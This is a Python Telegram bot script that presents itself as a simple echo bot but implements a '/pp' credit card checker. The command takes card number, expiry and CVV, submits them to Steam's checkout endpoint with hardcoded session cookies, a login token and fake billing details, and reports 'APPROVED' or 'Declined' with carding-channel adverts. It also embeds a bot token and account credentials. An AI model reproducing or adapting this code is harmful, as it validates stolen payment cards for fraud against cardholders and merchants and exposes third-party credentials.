#!/usr/bin/env python
# pylint: disable=unused-argument
# This program is dedicated to the public domain under the CC0 license.

"""
Simple Bot to reply to Telegram messages.

First, a few handler functions are defined. Then, those functions are passed to
the Application and registered at their respective places.
Then, the bot is started and runs until we press Ctrl-C on the command line.

Usage:
Basic Echobot example, repeats messages.
Press Ctrl-C on the command line or send a signal to the process to stop the
bot.
"""

import logging
import requests
from datetime import datetime
from requests import Request, Session


from telegram import ForceReply, Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)

# set higher logging level for httpx to avoid all GET and POST requests being logged
logging.getLogger("httpx").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

last_call = datetime.now()

# Define a few command handlers. These usually take the two arguments update and
# context.


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    user = update.effective_user
    await update.message.reply_html(
        rf"Hi {user.mention_html()}!",
        reply_markup=ForceReply(selective=True),
    )


async def hello(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(f'Hello {update.effective_user.first_name}')


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued."""
    global last_call

    cc = update.message.text.lstrip("/pp").strip()
    cc_infos = cc.split("|")

    if len(cc_infos) == 4 and len(cc_infos[0]) == 16 and len(cc_infos[1]) == 2 and len(cc_infos[2]) == 2 and len(cc_infos[3]) == 3:

        time_delta_obj = datetime.now() - last_call
        diff_in_mins = int(time_delta_obj.total_seconds()/60)
        waiting_mins = 3

        if diff_in_mins < waiting_mins:
            await update.message.reply_text("Try again after " + str(waiting_mins - diff_in_mins) + " minutes")
        else:
            last_call = datetime.now()
            url = 'https://checkout.steampowered.com/checkout/inittransaction/'
            raw_data = {'gidShoppingCart': '-1',
                        'gidReplayOfTransID': '-1',
                        'bUseAccountCart': '1',
                        'PaymentMethod': 'visa' if cc_infos[0][0] == "4" else "master",
                        'abortPendingTransactions': '0',
                        'bHasCardInfo': '1',
                        'CardNumber': cc_infos[0],
                        'CardExpirationYear': '20' + cc_infos[2],
                        'CardExpirationMonth': cc_infos[1],
                        'FirstName': 'cuong',
                        'LastName': 'guong',
                        'Address': 'hanoi',
                        'AddressTwo': '',
                        'Country': 'VN',
                        'City': '00000',
                        'State': '',
                        'PostalCode': '00000',
                        'Phone': '%2B84973621400',
                        'ShippingFirstName': '',
                        'ShippingLastName': '',
                        'ShippingAddress': '',
                        'ShippingAddressTwo': '',
                        'ShippingCountry': 'VN',
                        'ShippingCity': '',
                        'ShippingState': '',
                        'ShippingPostalCode': '',
                        'ShippingPhone': '',
                        'bIsGift': '0',
                        'GifteeAccountID': '0',
                        'GifteeEmail': '', 'GifteeName': '',
                        'GiftMessage': '', 'Sentiment': '',
                        'Signature': '', 'ScheduledSendOnDate': '0',
                        'BankAccount': '',
                        'BankCode': '', 'BankIBAN': '',
                        'BankBIC': '', 'TPBankID': '',
                        'BankAccountID': '', 'bSaveBillingAddress': '1',
                        'gidPaymentID': '', 'bUseRemainingSteamAccount': '0',
                        'bPreAuthOnly': '0',
                        'sessionid': 'f9c8300f73ca66933d33d671'}

            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
            "cookie": "beginCheckoutCart=-1; ak_bmsc=E9B25738B5A2581036105B042D2E0E81~000000000000000000000000000000~YAAQetgjFzTR0+OQAQAAuBRV6hhvq+rWU+P/7HlYLNkdCTZk3FoDRw96F+BFfqj1QlySrsEY+hr5eGGpAssIwPHTdY08dV10sgxfhmtcWYS8d2NwTCLDEuT4hxAq4Q1DqNHynT8RVDex55l/HaTUZxCBNcZHSG54OFxqcEYwhTMUacEFPcLM2NVv5vcZ53V+QQfy0uRLTAez/fQu4/vvY2D2uTUbI6b35y4Qr3keg5ztIFcd90hXYIBWVnhTDUqY6mRl8/3I9mdG81mFB0N3/Z92rUBW1V1bsCR4CSYCy/CiWVwBfLMZGP7Usx6O++cYQ6uGAEUQ/Oh0LWx5l7IOwVpcNLUj/biuUQkiT75Z1NGM7nhXK62vrYkrM5TTaq5ys56OLGRE; bm_sv=ED3ADC661C6C52FC1C98FBD79B32C4CE~YAAQxb0oF0Ktp+SQAQAAiuFp6hi0S0TbzfPuh4whufVEQ75Cln5rf94ZLz4x/GTVxUj3dDXsradv8xzrsfjMkl6f2oO4m2scyT/To07H0NbRQftrpsDc5Quy9xwFNkidIyp3JzClgAYAmaqsUZKhQHwSJ/0OpOeT7gZLGmXb3ZvcZt/BprGf/gr3GJKpIA5Sp69N6y9t7+jyY7h84SCe4FTF34aQyQVykUXfjqqy3W0uOA7ob8NaSmF8D5ND/5As53/06njl~1; steamLoginSecure=76561199749494830%7C%7CeyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0.eyAiaXNzIjogInI6MEY4Q18yNEM5RDIzMF8zQTQ2MCIsICJzdWIiOiAiNzY1NjExOTk3NDk0OTQ4MzAiLCAiYXVkIjogWyAid2ViOmNoZWNrb3V0IiBdLCAiZXhwIjogMTcyMjAwNjM1OSwgIm5iZiI6IDE3MTMyNzk3MjUsICJpYXQiOiAxNzIxOTE5NzI1LCAianRpIjogIjBGOENfMjRDOUQyMzBfM0E0RDgiLCAib2F0IjogMTcyMTkxOTcyNSwgInJ0X2V4cCI6IDE3MjQ1MzQxMzQsICJwZXIiOiAwLCAiaXBfc3ViamVjdCI6ICIxMTguNjkuOTIuMTM4IiwgImlwX2NvbmZpcm1lciI6ICIxMTguNjkuOTIuMTM4IiB9.qRGIBvmZhP4yG3aDgDKF5YZnctjYhXCIUvzpDv3SNkPYi4iMxJVqvQgVkfPjTB7Y1lCxrlcfZaIUsSCProp2Cw; steamCountry=VN%7C7921503c1a53c173ec8f849447685639; browserid=3766782376100557103; sessionid=f9c8300f73ca66933d33d671; timezoneOffset=25200,0"}
            response = requests.post(url, headers=headers, data=raw_data)
            declined_result = """⚜️Card ➔  """ + cc + """
⚜️Status ➔  𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ 
⚜️Gateway ➔   Paypal 0.1 $ 
⚜️Response ➔  
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
⚜️Bank Info ➔   Pnc Bank, National Association 
⚜️Country ➔  United States of America (the) 🇺🇸
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
⚜️Free Bins ➔ @BinPost
⚜️Free CCs ➔ @RandomCreditCards
⚜️Buy ➔  @PremiumChecker"""
            approved_result = """
✨Card ➔ """ + cc + """
✨Status ➔  APPROVED ⚡️ 
✨Gateway ➔   Paypal 0.1 $ 
✨Response ➔ VALID_BILLING_ADDRESS ✅
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
✨Bin ➔ VISA;CREDIT;PLATIUM
✨Bank Info ➔   AU  Bank 
✨Country ➔  Australia
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

"""
            await update.message.reply_text(approved_result if response.json()["success"] == 1 else declined_result)
    else:
        await update.message.reply_text("Credit card is not correct " + cc)


async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Echo the user message."""
    await update.message.reply_text(update.message.text)


def main() -> None:
    """Start the bot."""
    # Create the Application and pass it your bot's token.
    application = Application.builder().token(
        "7437575787:AAGTMpWsOP1lo1gEEhEBPUvMzHbdJ0_qFJw").build()

    # on different commands - answer in Telegram
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hello", hello))
    application.add_handler(CommandHandler("pp", check_command))

    # on non command i.e message - echo the message on Telegram
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND, echo))

    # Run the bot until the user presses Ctrl-C
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
